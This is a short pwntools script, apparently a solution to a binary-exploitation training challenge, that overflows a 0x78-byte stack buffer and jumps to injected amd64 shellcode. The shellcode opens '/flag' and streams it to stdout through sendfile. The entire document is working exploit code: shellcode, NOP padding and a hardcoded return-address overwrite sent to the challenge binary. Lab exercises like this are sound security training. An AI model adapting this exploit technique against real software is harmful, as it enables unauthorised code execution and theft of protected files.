from pwn import *

buffer_size = 0x78
buffer_address = 0x7fffffffd1b0

shellcode = asm("""
    mov     rdi, 0x67616c662f
    push    rdi
    push    rsp
    pop     rdi

    push    O_RDONLY
    pop     rsi

    xor     rdx, rdx

    push    SYS_open
    pop     rax
    syscall

    xor     rdi, rdi
    inc     rdi

    xchg    rax, rsi
    xor     rdx, rdx
    push    0x40
    pop     r10

    push    SYS_sendfile
    pop     rax
    syscall

    push    SYS_exit
    pop     rax
    syscall

""", arch='amd64', os='linux')

payload = shellcode + b'\x90'*(buffer_size - len(shellcode))
payload += p64(buffer_address)

io = process(['/challenge/binary-exploitation-hijack-to-shellcode-w'])

io.send(payload)
io.recvline_contains(b'Goodbye!')

print(io.readall().decode())
